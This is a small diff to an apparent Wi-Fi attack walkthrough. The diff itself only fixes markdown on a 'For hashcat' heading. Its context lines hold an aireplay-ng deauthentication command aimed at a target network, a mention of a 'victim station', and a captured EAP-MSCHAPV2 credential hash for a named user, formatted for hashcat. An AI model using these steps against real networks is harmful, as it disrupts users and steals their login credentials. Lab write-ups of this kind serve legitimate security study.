@@ -247,7 +247,7 @@ sudo aireplay-ng -0 0 -e ${essid} -a ${bssid}  wlan1
 Now, if we come back to the first terminal, we can check if a victim station is connected.
 If so, you should get the password 
 
-For **hashcat******
+For **hashcat**
 ```bash
 MANA EAP EAP-MSCHAPV2 HASHCAT | juan.tr::::a20d33a6d69754cb550ce451d41ddb5c4d6794dab01e230a:95bf6ccfec26252d
 ```
